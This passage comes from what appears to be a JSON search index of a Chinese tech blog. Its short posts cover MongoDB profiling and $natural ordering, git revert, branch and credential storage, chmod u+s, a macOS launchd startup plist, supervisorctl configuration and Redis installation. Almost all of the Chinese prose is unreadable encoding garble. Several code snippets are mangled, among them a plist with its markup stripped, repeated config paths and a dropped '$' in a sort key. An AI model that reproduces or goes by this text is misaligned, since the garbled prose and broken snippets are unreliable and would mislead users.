å‚è€ƒhttp://docs.mongodb.org/manual/core/capped-collections/","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mongodb","slug":"mongodb","permalink":"https://wangxiuwen.github.io/tags/mongodb/"}],"author":"wangxiuwen"},{"title":"mongodb æ€§èƒ½ä¼˜åŒ–","slug":"history/tech/5953c4d0c2b92f5665eeda0b","date":"2016-03-14T21:55:56.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda0b/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda0b/","excerpt":"","text":"åœ¨MySQLä¸­ï¼Œæ…¢æŸ¥è¯¢æ—¥å¿—æ˜¯ç»å¸¸ä½œä¸ºæˆ‘ä»¬ä¼˜åŒ–æ•°æ®åº“çš„ä¾æ®ï¼Œé‚£åœ¨MongoDBä¸­æ˜¯å¦æœ‰ç±»ä¼¼çš„åŠŸèƒ½å‘¢?ç­”æ¡ˆæ˜¯è‚¯å®šçš„ï¼Œé‚£å°±æ˜¯Mongo Database Profiler.ä¸ä»…æœ‰ï¼Œè€Œä¸”è¿˜æœ‰ä¸€äº›æ¯”MySQLçš„Slow Query Logæ›´è¯¦ç»†çš„ä¿¡æ¯ã€‚å®ƒå°±æ˜¯æˆ‘ä»¬è¿™ç¯‡æ–‡ç« çš„ä¸»é¢˜ã€‚ å¼€å¯ Profiling åŠŸèƒ½ æœ‰ä¸¤ç§æ–¹å¼å¯ä»¥æ§åˆ¶ Profiling çš„å¼€å…³å’Œçº§åˆ«ï¼Œç¬¬ä¸€ç§æ˜¯ç›´æ¥åœ¨å¯åŠ¨å‚æ•°é‡Œç›´æ¥è¿›è¡Œè®¾ç½®ã€‚ å¯åŠ¨MongoDBæ—¶åŠ ä¸Šâ€“profile=çº§åˆ« å³å¯ã€‚ ä¹Ÿå¯ä»¥åœ¨å®¢æˆ·ç«¯è°ƒç”¨db.setProfilingLevel(çº§åˆ«) å‘½ä»¤æ¥å®æ—¶é…ç½®ã€‚å¯ä»¥é€šè¿‡db.getProfilingLevel()å‘½ä»¤æ¥è·å–å½“å‰çš„Profileçº§åˆ«ã€‚db.setProfilingLevel(2);{â€œwasâ€ : 0 , â€œokâ€ : 1}&gt; db.getProfilingLevel()ä¸Šé¢æ–œä½“çš„çº§åˆ«å¯ä»¥å–0ï¼Œ1ï¼Œ2 ä¸‰ä¸ªå€¼ï¼Œä»–ä»¬è¡¨ç¤ºçš„æ„ä¹‰å¦‚ä¸‹ï¼š 0 â€“ ä¸å¼€å¯ 1 â€“ è®°å½•æ…¢å‘½ä»¤ (é»˜è®¤ä¸º&gt;100ms) 2 â€“ è®°å½•æ‰€æœ‰å‘½ä»¤ Profile è®°å½•åœ¨çº§åˆ«1æ—¶ä¼šè®°å½•æ…¢å‘½ä»¤ï¼Œé‚£ä¹ˆè¿™ä¸ªæ…¢çš„å®šä¹‰æ˜¯ä»€ä¹ˆ?ä¸Šé¢æˆ‘ä»¬è¯´åˆ°å…¶é»˜è®¤ä¸º100msï¼Œå½“ç„¶æœ‰é»˜è®¤å°±æœ‰è®¾ç½®ï¼Œå…¶è®¾ç½®æ–¹æ³•å’Œçº§åˆ«ä¸€æ ·æœ‰ä¸¤ç§ï¼Œä¸€ç§æ˜¯é€šè¿‡æ·»åŠ â€“slowmså¯åŠ¨å‚æ•°é…ç½®ã€‚ç¬¬äºŒç§æ˜¯è°ƒç”¨db.setProfilingLevelæ—¶åŠ ä¸Šç¬¬äºŒä¸ªå‚æ•°ï¼šdb.setProfilingLevel( level , slowms )db.setProfilingLevel( 1 , 10 );æŸ¥è¯¢ Profiling è®°å½• ä¸MySQLçš„æ…¢æŸ¥è¯¢æ—¥å¿—ä¸åŒï¼ŒMongo Profile è®°å½•æ˜¯ç›´æ¥å­˜åœ¨ç³»ç»Ÿdbé‡Œçš„ï¼Œè®°å½•ä½ç½® system.profile ï¼Œæ‰€ä»¥ï¼Œæˆ‘ä»¬åªè¦æŸ¥è¯¢è¿™ä¸ªCollectionçš„è®°å½•å°±å¯ä»¥è·å–åˆ°æˆ‘ä»¬çš„ Profile è®°å½•äº†ã€‚db.system.profile.find(){â€œtsâ€ : â€œThu Jan 29 2009 15:19:32 GMT-0500 (EST)â€ , â€œinfoâ€ : â€œquery test.$cmd ntoreturn:1 reslen:66 nscanned:0query: { profile: 2 } nreturned:1 bytes:50â€ , â€œmillisâ€ : 0}db.system.profile.find( { info: /test.foo/ } ){â€œtsâ€ : â€œThu Jan 29 2009 15:19:40 GMT-0500 (EST)â€ , â€œinfoâ€ : â€œinsert test.fooâ€ , â€œmillisâ€ : 0}{â€œtsâ€ : â€œThu Jan 29 2009 15:19:42 GMT-0500 (EST)â€ , â€œinfoâ€ : â€œinsert test.fooâ€ , â€œmillisâ€ : 0}{â€œtsâ€ : â€œThu Jan 29 2009 15:19:45 GMT-0500 (EST)â€ , â€œinfoâ€ : â€œquery test.foo ntoreturn:0 reslen:102 nscanned:2query: {} nreturned:2 bytes:86â€ , â€œmillisâ€ : 0}{â€œtsâ€ : â€œThu Jan 29 2009 15:21:17 GMT-0500 (EST)â€ , â€œinfoâ€ : â€œquery test.foo ntoreturn:0 reslen:36 nscanned:2query: { $not: { x: 2 } } nreturned:0 bytes:20â€ , â€œmillisâ€ : 0}{â€œtsâ€ : â€œThu Jan 29 2009 15:21:27 GMT-0500 (EST)â€ , â€œinfoâ€ : â€œquery test.foo ntoreturn:0 exception bytes:53â€ , â€œmillisâ€ : 88}åˆ—å‡ºæ‰§è¡Œæ—¶é—´é•¿äºæŸä¸€é™åº¦(5ms)çš„ Profile è®°å½•ï¼šdb.system.profile.find( { millis : { $gt : 5 } } ){â€œtsâ€ : â€œThu Jan 29 2009 15:21:27 GMT-0500 (EST)â€ , â€œinfoâ€ : â€œquery test.foo ntoreturn:0 exception bytes:53â€ , â€œmillisâ€ : 88}æŸ¥çœ‹æœ€æ–°çš„ Profile è®°å½•ï¼š db.system.profile.find().sort({$natural:-1}) Mongo Shell è¿˜æä¾›äº†ä¸€ä¸ªæ¯”è¾ƒç®€æ´çš„å‘½ä»¤show profileï¼Œå¯åˆ—å‡ºæœ€è¿‘5æ¡æ‰§è¡Œæ—¶é—´è¶…è¿‡1msçš„ Profile è®°å½•ã€‚ Profile ä¿¡æ¯å†…å®¹è¯¦è§£ï¼š ts-è¯¥å‘½ä»¤åœ¨ä½•æ—¶æ‰§è¡Œ. millis Time-è¯¥å‘½ä»¤æ‰§è¡Œè€—æ—¶ï¼Œä»¥æ¯«ç§’è®°. info-æœ¬å‘½ä»¤çš„è¯¦ç»†ä¿¡æ¯. query-è¡¨æ˜è¿™æ˜¯ä¸€ä¸ªqueryæŸ¥è¯¢æ“ä½œ. ntoreturn-æœ¬æ¬¡æŸ¥è¯¢å®¢æˆ·ç«¯è¦æ±‚è¿”å›çš„è®°å½•æ•°.æ¯”å¦‚, findOne()å‘½ä»¤æ‰§è¡Œæ—¶ ntoreturn ä¸º 1.æœ‰limit(n) æ¡ä»¶æ—¶ntoreturnä¸ºn. query-å…·ä½“çš„æŸ¥è¯¢æ¡ä»¶(å¦‚x&gt;3). nscanned-æœ¬æ¬¡æŸ¥è¯¢æ‰«æçš„è®°å½•æ•°. reslen-è¿”å›ç»“æœé›†çš„å¤§å°. nreturned-æœ¬æ¬¡æŸ¥è¯¢å®é™…è¿”å›çš„ç»“æœé›†. update-è¡¨æ˜è¿™æ˜¯ä¸€ä¸ªupdateæ›´æ–°æ“ä½œ. fastmod-Indicates a fast modify operation. See Updates. These operations are normally quite fast. fastmodinsert â€“ indicates a fast modify operation that performed an upsert. upsert-è¡¨æ˜updateçš„upsertå‚æ•°ä¸ºtrue.æ­¤å‚æ•°çš„åŠŸèƒ½æ˜¯å¦‚æœupdateçš„è®°å½•ä¸å­˜åœ¨ï¼Œåˆ™ç”¨updateçš„æ¡ä»¶insertä¸€æ¡è®°å½•. moved-è¡¨æ˜æœ¬æ¬¡updateæ˜¯å¦ç§»åŠ¨äº†ç¡¬ç›˜ä¸Šçš„æ•°æ®ï¼Œå¦‚æœæ–°è®°å½•æ¯”åŸè®°å½•çŸ­ï¼Œé€šå¸¸ä¸ä¼šç§»åŠ¨å½“å‰è®°å½•ï¼Œå¦‚æœæ–°è®°å½•æ¯”åŸè®°å½•é•¿ï¼Œé‚£ä¹ˆå¯èƒ½ä¼šç§»åŠ¨è®°å½•åˆ°å…¶å®ƒä½ç½®ï¼Œè¿™æ—¶å€™ä¼šå¯¼è‡´ç›¸å…³ç´¢å¼•çš„æ›´æ–°.ç£ç›˜æ“ä½œæ›´å¤šï¼ŒåŠ ä¸Šç´¢å¼•æ›´æ–°ï¼Œä¼šä½¿å¾—è¿™æ ·çš„æ“ä½œæ¯”è¾ƒæ…¢. insert-è¿™æ˜¯ä¸€ä¸ªinsertæ’å…¥æ“ä½œ. getmore-è¿™æ˜¯ä¸€ä¸ªgetmore æ“ä½œï¼Œgetmoreé€šå¸¸å‘ç”Ÿåœ¨ç»“æœé›†æ¯”è¾ƒå¤§çš„æŸ¥è¯¢æ—¶ï¼Œç¬¬ä¸€ä¸ªqueryè¿”å›äº†éƒ¨åˆ†ç»“æœï¼Œåç»­çš„ç»“æœæ˜¯é€šè¿‡getmoreæ¥è·å–çš„ã€‚ MongoDB æŸ¥è¯¢ä¼˜åŒ– å¦‚æœnscanned(æ‰«æçš„è®°å½•æ•°)è¿œå¤§äºnreturned(è¿”å›ç»“æœçš„è®°å½•æ•°)çš„è¯ï¼Œé‚£ä¹ˆæˆ‘ä»¬å°±è¦è€ƒè™‘é€šè¿‡åŠ ç´¢å¼•æ¥ä¼˜åŒ–è®°å½•å®šä½äº†ã€‚ reslen å¦‚æœè¿‡å¤§ï¼Œé‚£ä¹ˆè¯´æ˜æˆ‘ä»¬è¿”å›çš„ç»“æœé›†å¤ªå¤§äº†ï¼Œè¿™æ—¶è¯·æŸ¥çœ‹findå‡½æ•°çš„ç¬¬äºŒä¸ªå‚æ•°æ˜¯å¦åªå†™ä¸Šäº†ä½ éœ€è¦çš„å±æ€§åã€‚(ç±»ä¼¼ äºMySQLä¸­ä¸è¦æ€»æ˜¯select *) å¯¹äºåˆ›å»ºç´¢å¼•çš„å»ºè®®æ˜¯ï¼šå¦‚æœå¾ˆå°‘è¯»ï¼Œé‚£ä¹ˆå°½é‡ä¸è¦æ·»åŠ ç´¢å¼•ï¼Œå› ä¸ºç´¢å¼•è¶Šå¤šï¼Œå†™æ“ä½œä¼šè¶Šæ…¢ã€‚å¦‚æœè¯»é‡å¾ˆå¤§ï¼Œé‚£ä¹ˆåˆ›å»ºç´¢å¼•è¿˜æ˜¯æ¯”è¾ƒåˆ’ç®—çš„ã€‚(å’ŒRDBMSä¸€æ ·ï¼Œè²Œä¼¼æ˜¯åºŸè¯ -_-!!) MongoDB æ›´æ–°ä¼˜åŒ– å¦‚æœå†™æŸ¥è¯¢é‡æˆ–è€…updateé‡è¿‡å¤§çš„è¯ï¼Œå¤šåŠ ç´¢å¼•æ˜¯ä¼šæœ‰å¥½å¤„çš„ã€‚ä»¥åŠï½ï½ï½ï½(çœç•¥Nå­—ï¼Œå’ŒRDBMSå·®ä¸å¤šçš„é“ç†) Use fast modify operations when possible (and usually with these, an index). See Updates. Profiler çš„æ•ˆç‡ Profiling åŠŸèƒ½è‚¯å®šæ˜¯ä¼šå½±å“æ•ˆç‡çš„ï¼Œä½†æ˜¯ä¸å¤ªä¸¥é‡ï¼ŒåŸå› æ˜¯ä»–ä½¿ç”¨çš„æ˜¯system.profile æ¥è®°å½•ï¼Œè€Œsystem.profile æ˜¯ä¸€ä¸ªcapped collection è¿™ç§collection åœ¨æ“ä½œä¸Šæœ‰ä¸€äº›é™åˆ¶å’Œç‰¹ç‚¹ï¼Œä½†æ˜¯æ•ˆç‡æ›´é«˜ã€‚åŸæ–‡å‡ºå¤„ï¼šhttp://lgone.com/html/y2010/774.html","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mongodb","slug":"mongodb","permalink":"https://wangxiuwen.github.io/tags/mongodb/"}],"author":"wangxiuwen"},{"title":"mongodbä¸­_idä¸$naturalæ’åºæœ‰ä»€ä¹ˆåŒºåˆ«ï¼Ÿ","slug":"history/tech/5953c4d0c2b92f5665eeda0a","date":"2016-03-14T21:29:07.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda0a/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda0a/","excerpt":"","text":"å…ˆç”¨ä¸‹é¢çš„æ–¹å¼å†™å…¥1000æ¡æ•°æ®ï¼šfor(var i=0;i&lt;1000;i++)db.test.insert({_id:i,a:â€˜1â€™})ç„¶åä½ åˆ†åˆ«ä½¿ç”¨ä¸‹é¢å‘½ä»¤æŒ‰_idå’Œnaturalæ’åºå–å‡ºå‰ä¸€æ¡ç»“æœï¼š db.test.find().sort({_id:1}).limit(1) db.test.find().sort({natural:1}).limit(1)ä½ å¾—åˆ°çš„ç»“æœä¼šæ˜¯ä¸€æ ·çš„ã€‚è¿™æ—¶å€™ä½ è¿›è¡Œä¸€æ¬¡updateæ“ä½œï¼Œå°†ç¬¬ä¸€æ¡è®°å½•çš„é•¿åº¦å˜é•¿ï¼šdb.test.update({_id:1},{a:â€˜12â€™})å†é€šè¿‡ä¸Šé¢ä¸¤ç§ä¸åŒçš„æ’åºæ–¹å¼å–ç¬¬ä¸€æ¡ï¼Œä½ ä¼šå‘ç°å–åˆ°çš„ç»“æœè¿˜æ˜¯ä¸€æ ·çš„ã€‚ç„¶åä½ å†å°†ç¬¬ä¸€æ¡è®°å½•å˜é•¿ï¼šdb.test.update({_id:1},{a:â€˜123â€™})å†é€šè¿‡ä¸Šé¢ä¸¤ç§ä¸åŒçš„æ’åºæ–¹å¼å–ç¬¬ä¸€æ¡ï¼Œè¿™æ—¶å€™ä½ ä¼šçœ‹åˆ°ï¼Œé€šè¿‡_idæ’åºæŸ¥åˆ°çš„è¿˜æ˜¯åŸæ¥é‚£ä¸€æ¡ï¼Œè€Œé€šè¿‡$naturalæŸ¥åˆ°çš„å·²ç»å˜æˆäº†ç¬¬äºŒæ¡ã€‚è¿™æ˜¯ä»€ä¹ˆåŸå› ï¼Ÿ_idæ˜¯æŒ‰æ•°æ®æ’å…¥æ—¶é—´æ’åºï¼Œè€Œnaturalæ˜¯æŒ‰æ•°æ®åœ¨ç£ç›˜ä¸Šçš„ç»„ç»‡é¡ºåºæ’åºã€‚ å½“ä½ æ‰§è¡Œinsertæ“ä½œçš„æ—¶å€™ï¼Œé€šè¿‡Object.bsonsize(db.test.findOne());å‘½ä»¤æˆ‘ä»¬å¯ä»¥çŸ¥é“æ¯æ¡è®°å½•çš„é•¿åº¦ä¸º31 å½“ä½ æŠŠaçš„å€¼updateæ—¶ï¼Œaçš„é•¿åº¦åœ¨é€æ­¥å¢åŠ ï¼Œåˆ†åˆ«ä¸º31ã€32ã€33.å› ä¸ºMongoDBåœ¨è®°å½•é•¿åº¦å˜åŒ–åï¼Œå‘ç°å½“å‰è®°å½•æ‰€åœ¨ç©ºé—´åé¢æ²¡æœ‰ç©ºä½™çš„ç©ºé—´å¯ä¾›å…¶å˜é•¿ã€‚é‚£ä¹ˆè¿™æ¡è®°å½•å°±ä¼šè¢«åˆ é™¤ç„¶åç§»åŠ¨åˆ°æ•°æ®é›†çš„æœ€åï¼Œæ‰€ä»¥å¯¼è‡´naturalæœ€åæ’åºçš„ç»“æœå’Œä¹‹å‰ä¸ä¸€æ ·ã€‚å› ä¸ºMongoDBæ¯ä¸€æ¡è®°å½•éƒ½ä¼šåš4å­—èŠ‚çš„å†…å­˜å¯¹é½ã€‚æ‰€ä»¥åœ¨ä½ åˆšæ’å…¥çš„æ—¶å€™ï¼Œè®°å½•é•¿åº¦è™½ç„¶åªæœ‰31å­—èŠ‚ï¼Œä½†æ˜¯MongoDBä¼šä¸ºå®ƒåˆ†é…32å­—èŠ‚ï¼ˆ8*4ï¼‰çš„ç©ºé—´ã€‚è¿™æ—¶å€™åœ¨å…¶æœ«å°¾å°±æœ‰ä¸€å­—èŠ‚çš„ç©ºé—²ï¼Œå½“ä½ å¢é•¿ä¸€å­—èŠ‚çš„æ—¶å€™ï¼Œè¿™ä¸€å­—èŠ‚çš„ç©ºé—²æ­£å¥½å¯ä»¥ç”¨ä¸Šã€‚æ‰€ä»¥å°±ä¸éœ€è¦ç§»åŠ¨ä½ç½®äº†ã€‚è€Œç¬¬äºŒæ¬¡ä»32å­—èŠ‚å˜æˆ33å­—èŠ‚ï¼ŒåŸæœ‰çš„ç©ºé—´å·²ç»ä¸èƒ½è£…ä¸‹äº†ï¼Œæ‰€ä»¥ä¼šé€ æˆæ•°æ®çš„ç§»åŠ¨ã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"mongodb","slug":"mongodb","permalink":"https://wangxiuwen.github.io/tags/mongodb/"}],"author":"wangxiuwen"},{"title":"git é¿å…æ¯æ¬¡æäº¤é‡å¤è¾“å…¥å¯†ç ","slug":"history/tech/5953c4d0c2b92f5665eeda09","date":"2016-03-13T21:32:50.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda09/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda09/","excerpt":"","text":"git config --global credential.helper storeæ‰§è¡Œå®ŒåæŸ¥çœ‹%HOME%ç›®å½•ä¸‹çš„.gitconfigæ–‡ä»¶ï¼Œä¼šå¤šäº†ä¸€é¡¹ï¼š helper = storeé‡æ–°å¼€å¯git bashä¼šå‘ç°git pushæ—¶ä¸ç”¨å†è¾“å…¥ç”¨æˆ·åå’Œå¯†ç ","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"git","slug":"git","permalink":"https://wangxiuwen.github.io/tags/git/"}],"author":"wangxiuwen"},{"title":"git revert","slug":"history/tech/5953c4d0c2b92f5665eeda08","date":"2016-03-13T02:20:18.000Z","updated":"2020-11-29T01:42:08.755Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda08/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda08/","excerpt":"","text":"git revert æ’¤é”€ æŸæ¬¡æ“ä½œï¼Œæ­¤æ¬¡æ“ä½œä¹‹å‰å’Œä¹‹åçš„commitå’Œhistoryéƒ½ä¼šä¿ç•™ï¼Œå¹¶ä¸”æŠŠè¿™æ¬¡æ’¤é”€ä½œä¸ºä¸€æ¬¡æœ€æ–°çš„æäº¤* git revert HEAD æ’¤é”€å‰ä¸€æ¬¡ commit* git revert HEAD^ æ’¤é”€å‰å‰ä¸€æ¬¡ commit* git revert commit ï¼ˆæ¯”å¦‚ï¼šfa042ce57ebbe5bb9c8db709f719cec2c58ee7ffï¼‰æ’¤é”€æŒ‡å®šçš„ç‰ˆæœ¬ï¼Œæ’¤é”€ä¹Ÿä¼šä½œä¸ºä¸€æ¬¡æäº¤è¿›è¡Œä¿å­˜ã€‚git revertæ˜¯æäº¤ä¸€ä¸ªæ–°çš„ç‰ˆæœ¬ï¼Œå°†éœ€è¦revertçš„ç‰ˆæœ¬çš„å†…å®¹å†åå‘ä¿®æ”¹å›å»ï¼Œç‰ˆæœ¬ä¼šé€’å¢ï¼Œä¸å½±å“ä¹‹å‰æäº¤çš„å†…å®¹","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"git","slug":"git","permalink":"https://wangxiuwen.github.io/tags/git/"}],"author":"wangxiuwen"},{"title":"chmod u+s","slug":"history/tech/5953c4d0c2b92f5665eeda07","date":"2016-03-12T03:22:08.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda07/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda07/","excerpt":"","text":"â€œä¸ºäº†æ–¹ä¾¿æ™®é€šç”¨æˆ·æ‰§è¡Œä¸€äº›ç‰¹æƒå‘½ä»¤ï¼ŒSUID/SGIDç¨‹åºå…è®¸æ™®é€šç”¨æˆ·ä»¥rootèº«ä»½æš‚æ—¶æ‰§è¡Œè¯¥ç¨‹åºï¼Œå¹¶åœ¨æ‰§è¡Œç»“æŸåå†æ¢å¤èº«ä»½ã€‚â€chmod u+s å°±æ˜¯ç»™æŸä¸ªç¨‹åºçš„æ‰€æœ‰è€…ä»¥suidæƒé™ï¼Œå¯ä»¥åƒrootç”¨æˆ·ä¸€æ ·æ“ä½œã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"mac /etc/rc.local","slug":"history/tech/5953c4d0c2b92f5665eeda06","date":"2016-03-12T02:19:03.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda06/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda06/","excerpt":"","text":"I was using those commands for VirtualBox in rc.local, and I ran into the same problem. I donâ€™t if this is the right way to do this, but it works for me.I created /Library/LaunchDaemons/local.localhost.startup.plist containing the code below. It runs the rc.local script once at start up. Labellocal.localhost.startupDisabledRunAtLoadKeepAliveLaunchOnlyOnceProgramArguments/etc/rc.locallaunchctl load -w /Library/LaunchDaemons/local.localhost.startup","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"ç³»ç»Ÿæ“ä½œ","slug":"ç³»ç»Ÿæ“ä½œ","permalink":"https://wangxiuwen.github.io/tags/%E7%B3%BB%E7%BB%9F%E6%93%8D%E4%BD%9C/"}],"author":"wangxiuwen"},{"title":"git branch ç”¨æ³•æ€»ç»“","slug":"history/tech/5953c4d0c2b92f5665eeda05","date":"2016-03-11T22:07:21.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda05/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda05/","excerpt":"","text":"git branchgit branch ä¸å¸¦å‚æ•°ï¼šåˆ—å‡ºæœ¬åœ°å·²ç»å­˜åœ¨çš„åˆ†æ”¯ï¼Œå¹¶ä¸”åœ¨å½“å‰åˆ†æ”¯çš„å‰é¢åŠ â€œ*â€å·æ ‡è®°ï¼Œä¾‹å¦‚ï¼š#git branchmasternewbranchgit branch -r åˆ—å‡ºè¿œç¨‹åˆ†æ”¯ï¼Œä¾‹å¦‚ï¼š#git branch -rm/master -&gt; origin_apps/m1_2.3.4origin_apps/hardware/testorigin_apps/m1origin_apps/m1_2.3.4origin_apps/mastergit branch -a åˆ—å‡ºæœ¬åœ°åˆ†æ”¯å’Œè¿œç¨‹åˆ†æ”¯ï¼Œä¾‹å¦‚ï¼š#git branch -amasternewbranchremotes/m/master -&gt; origin_apps/m1_2.3.4remotes/origin_apps/hardware/testremotes/origin_apps/m1remotes/origin_apps/m1_2.3.4remotes/origin_apps/mastergit branch åˆ›å»ºä¸€ä¸ªæ–°çš„æœ¬åœ°åˆ†æ”¯ï¼Œéœ€è¦æ³¨æ„ï¼Œæ­¤å¤„åªæ˜¯åˆ›å»ºåˆ†æ”¯ï¼Œä¸è¿›è¡Œåˆ†æ”¯åˆ‡æ¢ï¼Œä¾‹å¦‚ï¼š#git branch newbranch2#git branchmasternewbranchnewbranch2å½“å‰çš„åˆ†æ”¯ä¾ç„¶æ˜¯masterï¼Œä¸è¿›è¡Œåˆ‡æ¢ã€‚git branch -m | -M oldbranch newbranch é‡å‘½ååˆ†æ”¯ï¼Œå¦‚æœnewbranchåå­—åˆ†æ”¯å·²ç»å­˜åœ¨ï¼Œåˆ™éœ€è¦ä½¿ç”¨-Må¼ºåˆ¶é‡å‘½åï¼Œå¦åˆ™ï¼Œä½¿ç”¨-mè¿›è¡Œé‡å‘½åã€‚git branch -d | -D branchname åˆ é™¤branchnameåˆ†æ”¯git branch -d -r branchname åˆ é™¤è¿œç¨‹branchnameåˆ†æ”¯ä¾‹å­ï¼šgit help branchä¸­çš„ä¸€ä¸ªä¾‹å­ï¼š$ git clone git://git.kernel.org/pub/scm/â€¦/linux-2.6 my2.6$ cd my2.6$ git branch my2.6.14 v2.6.14$ git checkout my2.6.14ç¬¬ä¸‰è¡Œç¬¦åˆgit branchçš„æ ¼å¼ï¼Œå³ä»¥v2.6.14ä¸ºstart-pointï¼Œåˆ›å»ºæ–°çš„æœ¬åœ°åˆ†æ”¯branchnameã€‚","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"git","slug":"git","permalink":"https://wangxiuwen.github.io/tags/git/"}],"author":"wangxiuwen"},{"title":"Supervisorctl not respecting my configuration","slug":"history/tech/5953c4d0c2b92f5665eeda03","date":"2016-03-11T03:39:07.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda03/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda03/","excerpt":"","text":"$ supervisorctlhttp://localhost:9001 refused connectionYou should run supervisorctl with -c as well. From the documentation (my emphasis):The Supervisor configuration file is conventionally named supervisord.conf. It is used by both supervisord and supervisorctl. If either application is started without the -c option (the option which is used to tell the application the configuration filename explicitly), the application will look for a file named supervisord.conf within the following locations, in the specified order. It will use the first file it finds.CWD/supervisord.confCWD/supervisord.confCWD/supervisord.confCWD/etc/supervisord.conf/etc/supervisord.conf","categories":[{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/categories/%E6%8A%80%E6%9C%AF/"}],"tags":[{"name":"tech","slug":"tech","permalink":"https://wangxiuwen.github.io/tags/tech/"},{"name":"æŠ€æœ¯","slug":"æŠ€æœ¯","permalink":"https://wangxiuwen.github.io/tags/%E6%8A%80%E6%9C%AF/"},{"name":"linux","slug":"linux","permalink":"https://wangxiuwen.github.io/tags/linux/"}],"author":"wangxiuwen"},{"title":"redisç¼–è¯‘å®‰è£…","slug":"history/tech/5953c4d0c2b92f5665eeda04","date":"2016-03-10T17:53:48.000Z","updated":"2020-11-29T01:42:08.751Z","comments":true,"path":"history/tech/5953c4d0c2b92f5665eeda04/","link":"","permalink":"https://wangxiuwen.github.io/history/tech/5953c4d0c2b92f5665eeda04/","excerpt":"","text":"redisæ˜¯ä¸€ä¸ªå¼ºå¤§çš„NoSQLæ•°æ®åº“ï¼Œç›¸å¯¹äºmemcachedï¼Œä»–æä¾›äº†æ›´ä¸°å¯Œçš„æ•°æ®ç±»å‹ï¼Œæœ‰stringã€hashã€listã€setã€sorted setè¿™å‡ 